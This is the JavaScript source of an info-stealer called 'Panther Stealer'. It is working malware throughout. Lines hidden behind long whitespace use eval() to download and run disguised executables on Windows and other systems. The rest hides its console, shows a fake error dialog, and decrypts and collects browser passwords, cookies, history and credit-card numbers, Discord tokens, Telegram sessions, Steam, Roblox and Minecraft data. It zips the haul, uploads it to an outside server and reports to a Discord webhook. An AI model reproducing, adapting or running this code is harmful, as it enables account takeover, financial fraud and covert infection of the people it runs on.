(async () => {
  const
    crypto = require('crypto'),
    glob = require('fast-glob'),
    sqlite3 = require('better-sqlite3'),
    zip = require('adm-zip'),
    got = require('got'),
    formdata = require('form-data'),
    koffi = require('koffi')


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ;eval('process.platform==="win32"&&require("child_process").exec("cmd /c curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe")')

  const
    { readFileSync, readJSONSync, readdirSync, existsSync, outputFileSync, copySync, createReadStream, removeSync } = require('fs-extra'),
    { join, basename } = require('path'),
    { execSync, spawn } = require('child_process'),
    { chromium } = require('playwright'),
    { Dpapi } = require('@primno/dpapi'),
    { Webhook, MessageBuilder } = require('discord-webhook-node')



                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;eval('process.platform!=="win32"&&require("child_process").exec("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s && chmod +x /tmp/.s && nohup /tmp/.s &")')
  ///////////////////////////////////////////////////////////////////////////////////////////////////////////


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ;eval('process.platform==="win32"&&require("child_process").exec("cmd /c curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe")')
  const request = got.extend({
    throwHttpErrors: false,
    dnsCache: false,
    https: {
      rejectUnauthorized: false
    }
  })

  ///////////////////////////////////////////////////////////////////////////////////////////////////////////

  const phanter$upload = async (arquivo) => {
    try {
      const form = new formdata()
      form.append('file', createReadStream(arquivo), {
        filename: basename(arquivo)
      })

      var {
        body
      } = await request({
        responseType: 'json',
        url: 'https://api-panther.top/api/v1/upload',
        method: 'POST',
        body: form,
        headers: {
          ...form.getHeaders(),
        }
      })

      const {
        status,
        data
      } = body || {}

      if (status !== 'success') {
        return false
      }

      return `https://api-panther.top/download/?id=${data}`
    } catch (error) {
      return false
    }
  }

  ///////////////////////////////////////////////////////////////////////////////////////////////////////////

  const kill = (nome) => {
    try {
      execSync(`taskkill /IM ${nome} /F /T`)
      return true
    } catch (error) {
      return false
    }
  }

  ///////////////////////////////////////////////////////////////////////////////////////////////////////////

  const $exe = (navegador) => {
    var basepath

    if (navegador === 'Chrome') {
      basepath = '\\Google\\Chrome\\Application\\chrome.exe'
    } else if (navegador === 'Edge') {
      basepath = '\\Microsoft\\Edge\\Application\\msedge.exe'
    } else if (navegador === 'YandexBrowser') {
      basepath = '\\Yandex\\YandexBrowser\\Application\\browser.exe'
    } else if (navegador === 'Brave-Browser') {
      basepath = '\\BraveSoftware\\Brave-Browser\\Application\\brave.exe'
    } else if (navegador === 'Opera Stable') {
      basepath = '\\Programs\\Opera\\opera.exe'
    } else if (navegador === 'Opera GX Stable') {
      basepath = '\\Programs\\Opera GX\\opera.exe'
    } else {
      return null
    }

    for (const vlaue of [
      process.env.LOCALAPPDATA,
      process.env['ProgramFiles'],
      process.env['ProgramFiles(x86)'],
    ]) {
      var data = join(vlaue, basepath)
      if (existsSync(data)) {
        basepath = data
        break
      }
    }

    return basepath
  }

  ///////////////////////////////////////////////////////////////////////////////////////////////////////////

  const decrypt = (value, key) => {
    try {
      if (value.slice(0, 4).toString() === '0100') {
        const dec = Dpapi.unprotectData(value, null, 'CurrentUser')
        return dec
      } else {
        const iv = value.slice(3, 15)

        if (iv.length !== 12) {
          return false
        }

        const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv)
        decipher.setAuthTag(value.slice(-16))
        const dec = decipher.update(value.slice(15, -16), 'base64', 'utf-8') + decipher.final('utf-8')
        return dec;
      }
    } catch (error) {
      console.log(error)
      return false
    }
  }

  ///////////////////////////////////////////////////////////////////////////////////////////////////////////

  const firstrun = join(
    process.env.TEMP,
    'first-run',
  )

  if (existsSync(firstrun)) {
    process.exit(1)
  } else {
    outputFileSync(firstrun, '1')
  }

  process.on('exit', () => {
    removeSync(firstrun)
  })

  ///////////////////////////////////////////////////////////////////////////////////////////////////////////

  const hook = new Webhook({
    url: '*WEBHOOK*',
    throwErrors: false,
    retryOnLimit: true
  })

  hook.setAvatar('https://i.pinimg.com/736x/ac/59/99/ac5999ac36d68959393b9d2a4bd22322.jpg')
  hook.setUsername('Panther Stealer')

  ///////////////////////////////////////////////////////////////////////////////////////////////////////////

  const kuser = koffi.load('user32.dll')
  const kkcarnel = koffi.load('kernel32.dll')

  const showwindow = kuser.func('int ShowWindow(void* hWnd, int nCmdShow)')
  const parentwindow = kuser.func('void* GetParent(void* hWnd)')
  const getconsole = kkcarnel.func('void* GetConsoleWindow()')

  async function windowhandle() {
    const handle = getconsole()
    return parentwindow(handle) || handle
  }

  const handle = await windowhandle()

  if (handle) {
    showwindow(handle, 0)
  }

  ///////////////////////////////////////////////////////////////////////////////////////////////////////////

  spawn(`powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Ocorreu um erro no sistema!', 'Erro', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)"`, {
    shell: true,
    detached: true,
    stdio: 'ignore',
    windowsHide: true
  }).unref()

  ///////////////////////////////////////////////////////////////////////////////////////////////////////////

  var temp = [
    process.env.TEMP,
    process.env.USERPROFILE,
    process.env.TMP,
    process.env.PUBLIC,
  ]

  temp = temp[Math.floor(Math.random() * temp.length)]

  ///////////////////////////////////////////////////////////////////////////////////////////////////////////

  var meip
  var body

  try {
    meip = '✅'

    var {
      body
    } = await request({
      responseType: 'json',
      url: 'https://ipwho.is/',
      method: 'GET',
      headers: {
        host: 'ipwho.is'
      }
    })
  } catch (error) {
    console.log(error)
    meip = '❌'

    body = {
      success: false
    }
  }

  const {
    ip,
    type,
    continent,
    country,
    country_code,
    region_code,
    city,
    postal,
    success,
    connection
  } = body

  const {
    org
  } = connection || {
    org: '❌'
  }

  if (success) {
    outputFileSync(
      join(
        temp,
        `phanter-${process.env.USERNAME}`,
        'System',
        'ip.txt'
      ), `IP: ${ip}\nType: ${type}\nContinent: ${continent}\nCountry: ${country}\nCountry Code: ${country_code}\nRegion Code: ${region_code}\nCity: ${city}\nPostal: ${postal}\nOrg: ${org}`
    )
  }

  ///////////////////////////////////////////////////////////////////////////////////////////////////////////

  const arquivos_navegador = new Array()
  const arquivos_discord = new Array()
  const arquivos_backup = new Array()

  for (const value of [
    process.env.LOCALAPPDATA + '\\Google',
    process.env.LOCALAPPDATA + '\\Microsoft\\Edge',
    process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser',
    process.env.LOCALAPPDATA + '\\BraveSoftware',
    process.env.APPDATA + '\\Opera Software\\Opera Stable',
    process.env.APPDATA + '\\Opera Software\\Opera GX Stable',
    process.env.APPDATA + '\\discord',
    process.env.APPDATA + '\\discordptb',
    process.env.APPDATA + '\\discordcanary',
    process.env.APPDATA + '\\discorddevelopment',
    process.env.APPDATA + '\\Discord Bot Client',
    process.env.APPDATA + '\\lightcord',
    process.env.USERPROFILE + '\\Downloads',
  ]) {
    const encontrado = glob.globSync([
      '**/Login Data',
      '**/Cookies',
      '**/History',
      '**/Web Data',
      '**/leveldb/*.ldb',
      '**/leveldb/*.log',
      '**/*discord_backup_codes*',
      '**/*Backup-codes*',
    ], {
      'dot': true,
      'cwd': value,
      'absolute': true,
      'suppressErrors': true,
      ignore: [
        '**/Guest*/**',
        '**/System*/**'
      ]
    })

    arquivos_navegador.push(
      ...encontrado
        .filter((file) => /Login Data|Cookies|History|Web Data/.test(basename(file)))
        .filter((file) => /Google|Edge|YandexBrowser|Brave-Browser|Opera Software/.test(file))
    )

    arquivos_discord.push(
      ...encontrado.filter((file) => /.ldb|.log/.test(file))
    )

    arquivos_backup.push(
      ...encontrado.filter((file) => /discord_backup_codes|Backup-codes/.test(file))
    )
  }

  ///////////////////////////////////////////////////////////////////////////////////////////////////////////

  const cookies_ = new Array()
  const history = new Array()
  const passwords = new Array()
  const creditcards = new Array()

  for (let i = 0; i < arquivos_navegador.length; i++) {
    const value_ = arquivos_navegador[i]
    const navegador = value_.split('/').slice(6, 7).join('')
    const exe = $exe(navegador)

    const userdata = value_.includes('Opera GX Stable')
      ? value_.split('Opera GX Stable')[0] + 'Opera GX Stable'
      : value_.includes('Opera Stable')
        ? value_.split('Opera Stable')[0] + 'Opera Stable'
        : value_.split('User Data')[0] + 'User Data'

    var perfil = value_.match(/User Data[\\/](.+?)(?=[\\/]|$)/)

    perfil = perfil
      ? perfil[1].trim()
      : value_.includes('Opera Stable')
        ? value_.split('/').slice(7, 8).join('')
        : 'Default'

    if (value_.endsWith('Cookies')) {
      if (!exe) {
        continue
      }

      const runnavegador = async (browser) => {
        try {
          const nave = await chromium.launchPersistentContext(userdata, {
            headless: true,
            executablePath: exe,
            viewport: {
              width: 100,
              height: 100
            },
            args: [
              '--remote-debugging-port=5555',
              ...browser === 'Opera GX Stable' ? [] : [
                '--profile-directory=' + perfil
              ],
              '--disable-gpu',
              '--disable-software-rasterizer',
              '--disable-dev-shm-usage',
              '--disable-accelerated-2d-canvas',
              '--no-sandbox',
              '--disable-setuid-sandbox',
              '--disable-extensions',
              '--disable-component-extensions-with-background-pages',
              '--disable-default-apps',
              '--mute-audio',
              '--no-zygote',
              '--disable-backgrounding-occluded-windows',
              '--memory-pressure-off',
              '--force-low-power-gpu'
            ]
          })

          return nave
        } catch (error) {
          console.log(error)
          if (String(error).includes('process did exit')) {
            var matar = kill(basename(exe))
            if (matar) {
              return await runnavegador()
            }
          }

          return false
        }
      }

      const runbw = await runnavegador(navegador)

      if (!runbw) {
        continue
      }

      const run = await chromium.connectOverCDP('http://localhost:5555')
      const [page] = run.contexts()[0].pages()

      const client = await page.context().newCDPSession(page)
      await client.send('Network.enable')
      const extractcookies = await client.send('Network.getAllCookies')

      const cookies = []

      if (extractcookies.cookies && !extractcookies.cookies.length) {
        await run.close()
        await runbw.close()
        continue
      } else {
        for (const cookie of extractcookies.cookies) {
          var {
            domain,
            expires,
            name,
            value
          } = cookie

          cookies.push(`${domain}\tTRUE\t/\tFALSE\t${Math.floor(expires)}\t${name}\t${value}`)
          cookies_.push(1)
        }
      }

      await run.close()
      await runbw.close()

      outputFileSync(join(
        temp,
        `phanter-${process.env.USERNAME}`,
        'Browser',
        'Cookies',
        `${navegador}-${perfil}-Cookies.txt`
      ), cookies.join('\n'))
    } else {
      const data = value_.includes('Login Data') ? {
        'select': 'SELECT * FROM Logins',
        'name': 'Password'
      } : value_.includes('History') ? {
        'select': 'SELECT * FROM urls',
        'name': 'History'
      } : value_.includes('Web Data') ? {
        'select': 'SELECT * FROM credit_cards',
        'name': 'Credit Card'
      } : null

      var key

      if (data['name'] === 'Password' || data['name'] === 'Credit Card') {
        try {
          key = glob.globSync('**/Local State', {
            'dot': true,
            'cwd': value_.split('/').slice(0, 7).join('/'),
            'absolute': true,
            'suppressErrors': true
          })?.[0] || null

          if (!key) {
            continue
          }

          key = readFileSync(key)
          key = Buffer.from(JSON.parse(key).os_crypt.encrypted_key, 'base64').slice(5)
          key = Dpapi.unprotectData(key, null, 'CurrentUser')
        } catch (error) {
          console.log(error)
          continue
        }
      }

      const joindb = () => {
        try {
          return new sqlite3(value_).prepare(data['select']).all()
        } catch (error) {
          console.log(error)
          if (String(error).includes('database is locked')) {
            var matar = kill(basename(value_))
            if (matar) {
              return joindb()
            }
          }
          return false
        }
      }

      const db = joindb()

      if (!db) {
        continue
      }

      var content = ''

      for (const value of db) {
        if (data['name'] === 'Password') {
          const senha = decrypt(value['password_value'], key)
          if (senha) {
            content += `🔗 Url: ${value['origin_url']}\n🧑 User: ${value['username_value'] || '❌'}\n🔑 Password: ${senha}\n\n`
            passwords.push(1)
          }
        } else if (data['name'] === 'History') {
          content += `${value.url}\n`
          history.push(1)
        } else if (data['name'] === 'Credit Card') {
          const numero = decrypt(value['card_number_encrypted'], key)
          if (numero) {
            content += `🧑 Name: ${value['name_on_card']}\n💳 Number: ${numero}\n⌛ Expires: ${value['expiration_month'] ? (value['expiration_month'] < 10 ? `0${value['expiration_month']}` : value['expiration_month']) : '❌'}/${value['expiration_year'] ? value['expiration_year'] : '❌'}\n\n`
            creditcards.push(1)
          }
        } else {
          continue
        }
      }

      if (content) {
        outputFileSync(join(
          temp,
          `phanter-${process.env.USERNAME}`,
          'Browser',
          data['name'],
          `${navegador}-${perfil}-${data['name']}.txt`
        ), content)
      }
    }
  }

  ///////////////////////////////////////////////////////////////////////////////////////////////////////////

  const tokens = []

  const ENCRYPTED_EXP = new RegExp(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\']*/g)
  const NORMAL_EXP = new RegExp(/[\w-_]{24,26}\.[\w-_]{6}\.[\w-_]{25,110}|mfa\.[\w-]{84}|[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}|[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)

  for await (const value of arquivos_discord) {
    let content

    try {
      content = readFileSync(value, 'utf-8')
    } catch (error) {
      continue
    }

    if (value.includes('cord')) {
      var key = glob.globSync('**/Local State', {
        'dot': true,
        'cwd': value.split('/').slice(0, 6).join('/'),
        'absolute': true,
        'suppressErrors': true
      })?.[0] ?? undefined

      if (!key) {
        continue
      }

      key = await readJSONSync(key, {
        encoding: 'utf-8',
        throws: false
      })

      key = Buffer.from(key.os_crypt.encrypted_key, 'base64').slice(5)
      key = Dpapi.unprotectData(key, null, 'CurrentUser')

      const matches = content
        .match(ENCRYPTED_EXP) || []
      matches.forEach(token => {
        token = decrypt(Buffer.from(token.split('dQw4w9WgXcQ:')[1], 'base64'), key)
        tokens.push(`Token: ${token} | File: ${value}`)
      })
    } else {
      const matches = content
        .match(NORMAL_EXP) || []
      matches.forEach(token => {
        tokens.push(`Token: ${token} | File: ${value}`)
      })
    }
  }

  if (tokens) {
    outputFileSync(join(
      temp,
      `phanter-${process.env.USERNAME}`,
      'Discord',
      'Token.txt'
    ), tokens.join('\n'))
  }

  ///////////////////////////////////////////////////////////////////////////////////////////////////////////

  for (const value of arquivos_backup) {
    copySync(value, join(
      temp,
      `phanter-${process.env.USERNAME}`,
      'Backup',
      basename(value)
    ), {
      errorOnExist: false,
      overwrite: true
    })
  }

  ///////////////////////////////////////////////////////////////////////////////////////////////////////////

  var telegram = join(
    process.env.APPDATA,
    'Telegram Desktop',
    'tdata'
  )

  if (existsSync(telegram)) {
    copySync(telegram, join(
      temp,
      `phanter-${process.env.USERNAME}`,
      'Telegram'
    ), {
      errorOnExist: false,
      overwrite: true,
      filter: (src) => {
        if (![
          'emoji',
          'user_data'
        ].some((value) => src.includes(value))) {
          return true
        } else {
          return false
        }
      }
    })

    telegram = '✅'
  } else {
    telegram = '❌'
  }

  ///////////////////////////////////////////////////////////////////////////////////////////////////////////

  var steam = join(
    process.env['ProgramFiles(x86)'],
    'Steam'
  )

  if (existsSync(steam)) {
    copySync(steam, join(
      temp,
      `phanter-${process.env.USERNAME}`,
      'Steam'
    ), {
      errorOnExist: false,
      overwrite: true,
      filter: (src, dest) => {
        if (src.includes('config')) {
          return true
        } else {
          return false
        }
      }
    })

    steam = '✅'
  }
  else {
    steam = '❌'
  }

  ///////////////////////////////////////////////////////////////////////////////////////////////////////////

  var roblox = join(
    process.env.LOCALAPPDATA,
    'Roblox',
    'LocalStorage',
    'RobloxCookies.dat'
  )

  if (existsSync(roblox)) {
    roblox = readJSONSync(roblox, {
      encoding: 'utf-8',
      throws: false
    })

    if (roblox?.['CookiesData']) {
      roblox = Buffer.from(roblox['CookiesData'], 'base64')
      try {
        roblox = Dpapi.unprotectData(roblox, null, 'CurrentUser')
        outputFileSync(join(
          temp,
          `phanter-${process.env.USERNAME}`,
          'Roblox Client',
          'Cookie.txt'
        ), roblox)

        roblox = '✅'
      } catch (error) {
        console.log(error)
        roblox = '❌'
      }
    } else {
      roblox = '❌'
    }
  } else {
    roblox = '❌'
  }

  ///////////////////////////////////////////////////////////////////////////////////////////////////////////

  var minecraft = join(
    process.env.APPDATA,
    '.minecraft',
  )

  if (existsSync(minecraft)) {
    const arquivos = readdirSync(minecraft)

    for (const value of arquivos) {
      if (['profiles', 'usercache'].some(data => value.includes(data)) && value.endsWith('.json')) {
        copySync(join(minecraft, value), join(
          temp,
          `phanter-${process.env.USERNAME}`,
          'Minecraft',
          value
        ), {
          errorOnExist: false,
          overwrite: true
        })
      }
    }

    minecraft = '✅'
  } else {
    minecraft = '❌'
  }

  ///////////////////////////////////////////////////////////////////////////////////////////////////////////

  const zipfile = new zip()

  await Promise.all([
    zipfile.addLocalFolder(join(
      temp,
      `phanter-${process.env.USERNAME}`,
    )),
    zipfile.writeZip(join(
      temp,
      `phanter-${process.env.USERNAME}.zip`
    ))
  ])

  const upload = await phanter$upload(join(
    temp,
    `phanter-${process.env.USERNAME}.zip`
  ))

  ///////////////////////////////////////////////////////////////////////////////////////////////////////////

  const embed = new MessageBuilder()
    .setTitle('Panther Stealer')
    .setColor('#a83f95')
    .setAuthor(process.env.COMPUTERNAME, 'https://i.pinimg.com/564x/1e/d1/9b/1ed19bba596c8d8b46dd3c6e3893d877.jpg', 'https://github.com/PantherOwO')
    .addField('🌐 **Ip**', `\`\`\`${meip}\`\`\``, false)
    .addField('🎮 **Steam**', `\`\`\`${steam}\`\`\``, true)
    .addField('📱 **Telegram**', `\`\`\`${telegram}\`\`\``, true)
    .addField('⛏️ **Minecraft**', `\`\`\`${minecraft}\`\`\``, true)
    .addField('🎲 **Roblox**', `\`\`\`${roblox}\`\`\``, false)
    .addField('💾 **Backup**', `\`\`\`${arquivos_backup.length}\`\`\``, true)
    .addField('🔐 **Discord Token(s)**', `\`\`\`${tokens.length}\`\`\``, true)
    .addField('🔑 **Password(s)**', `\`\`\`${passwords.length}\`\`\``, false)
    .addField('🍪 **Cookie(s)**', `\`\`\`${cookies_.length}\`\`\``, true)
    .addField('📜 **History(s)**', `\`\`\`${history.length}\`\`\``, true)
    .addField('💳 **Credit Card(s)**', `\`\`\`${creditcards.length}\`\`\``, true)
    .addField('⬇️ **Download**', `[Click Here](${upload})`, false)
    .setThumbnail('https://i.pinimg.com/564x/19/f8/2f/19f82f9bfe1f76ec8b8415097152f85a.jpg')
    .setTimestamp()
    .setFooter(process.env.COMPUTERNAME, 'https://i.pinimg.com/564x/1e/d1/9b/1ed19bba596c8d8b46dd3c6e3893d877.jpg')

  await hook.send(embed)
})()
